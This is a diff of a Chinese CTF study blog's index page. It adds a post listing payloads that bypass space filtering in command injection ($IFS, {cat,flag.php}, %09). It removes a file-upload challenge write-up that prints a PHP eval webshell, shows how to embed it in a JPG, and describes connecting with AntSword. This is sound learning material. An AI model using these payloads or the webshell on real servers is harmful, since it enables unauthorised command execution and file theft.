@@ -155,6 +155,78 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://cxdshibaba.github.io/2022/04/26/%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%8F%AF%E9%87%87%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cxd的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/26/%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%8F%AF%E9%87%87%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">空格被过滤可采用的方法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-04-26 19:43:39" itemprop="dateCreated datePublished" datetime="2022-04-26T19:43:39+08:00">2022-04-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-07-23 14:06:40" itemprop="dateModified" datetime="2022-07-23T14:06:40+08:00">2022-07-23</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>过滤空格的解决办法如下</p>
+<p>$IFS<br>${IFS}<br>$IFS$1 //$1改成$加其他数字貌似都行<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  //用逗号实现了空格功能<br>%20<br>%09 </p>
+<h5 id=""><a href="#" class="headerlink" title="/**/"></a>/**/</h5>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://cxdshibaba.github.io/2022/04/25/php-filter-%E5%8D%8F%E8%AE%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -194,71 +266,6 @@
     
     <div class="post-body" itemprop="articleBody">
           <p><img src="https://i.bmp.ovh/imgs/2022/04/25/e8aa51b78f436428.png"><br>1是格式<br>2是可选参数，有read和write，字面意思就是读和写<br>3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>4是必选参数，后面写你要处理的文件名</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://cxdshibaba.github.io/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Cxd的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件上传漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2022-04-18 21:04:49 / Modified: 21:15:02" itemprop="dateCreated datePublished" datetime="2022-04-18T21:04:49+08:00">2022-04-18</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>攻防世界里的upload1题目，首先查看源代码，发现只能上传jpg格式的文件，尝试使用带有一句话木马的jpg图片。<br>如何准备一句话木马：<br>1、准备任意图片pho.jpg<br>2、准备木马文件hack.php<br><?php @eval($_POST['hack']);?><br>3、利用系统命令，将木马复制到图片文件中，产生图片木马hack.jpg<br>copy pho.jpg/b+hack.php/a hack.jpg<br>将此文件上传，在burpsuite抓包<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/0c198b14cfe5ef3b.png"><br>然后修改文件后缀为php上传<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/4b87c1d34fc509bd.png"><br>这里显示上传成功，接着用蚁剑连接<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/e30b408e9ec8e432.png"><br>这里的地址要对应burpsuite上传的地址，最后成功拿到flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/9172616e410dafce.png"></p>
 
       
     </div>
@@ -832,7 +839,7 @@ print_r($class1_ser);
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
